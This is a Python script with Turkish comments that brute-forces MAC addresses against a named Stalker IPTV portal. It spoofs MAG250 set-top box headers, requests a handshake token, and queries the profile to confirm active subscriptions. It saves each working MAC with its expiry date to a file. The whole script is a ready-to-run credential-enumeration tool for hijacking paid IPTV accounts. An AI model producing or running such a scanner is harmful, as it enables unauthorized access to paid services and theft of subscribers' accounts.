import requests
import json
import re

# Senin verdiğin ana sunucu adresi
base_url = "http://4can.net:80"

def hesap_kontrol(mac):
    # Stalker Portal için standart header yapısı
    headers = {
        'User-Agent': 'MAG250',
        'X-User-Agent': 'Model: MAG250; SW: 2.14.03-r6',
        'Cookie': f'mac={mac}; stb_lang=en; timezone=Europe/Istanbul;',
        'Referer': f'{base_url}/c/',
        'Connection': 'Keep-Alive'
    }
    
    portal_php = f"{base_url}/portal.php"
    
    try:
        # 1. ADIM: Handshake ve Token Alımı
        params = {'type': 'stb', 'action': 'handshake', 'token': ''}
        res = requests.get(portal_php, params=params, headers=headers, timeout=7)
        token = res.json().get('js', {}).get('token')
        
        if token:
            # 2. ADIM: Profil Bilgisi Sorgulama (Gerçeklik Testi)
            # Bu kısım sahte panelleri anında eler.
            info_params = {'type': 'stb', 'action': 'get_profile', 'token': token}
            info_res = requests.get(portal_php, params=info_params, headers=headers, timeout=7)
            data = info_res.json().get('js', {})
            
            # Eğer 'shoutcast' veya 'version' gibi anahtarlar geliyorsa cihaz onaylanmıştır
            if data and ('version' in data or 'city' in data):
                expiry = data.get('expired', 'Bilinmiyor')
                print(f"✅ BULUNDU: {mac} | Bitiş: {expiry}")
                return f"{mac} | SKT: {expiry}"
                
    except Exception:
        pass
    return None

def taramayi_baslat(adet=100):
    # Genelde 00:1A:79:.. blokları en verimlisidir
    mac_prefix = "00:1A:79:4C:A5" 
    print(f"🚀 {base_url} üzerinde {mac_prefix} bloğu taranıyor...")
    
    aktif_list = []
    
    for i in range(adet):
        suffix = hex(i)[2:].zfill(2).upper()
        test_mac = f"{mac_prefix}:{suffix}"
        
        sonuc = hesap_kontrol(test_mac)
        if sonuc:
            aktif_list.append(sonuc)
            # Bulunanı anında dosyaya yaz (çökme ihtimaline karşı)
            with open("dogrulanan_hesaplar.txt", "a") as f:
                f.write(f"{base_url}/c/ | {sonuc}\n")

    print(f"\n🏁 Tarama bitti. Toplam {len(aktif_list)} adet aktif MAC bulundu.")

if __name__ == "__main__":
    taramayi_baslat(50)
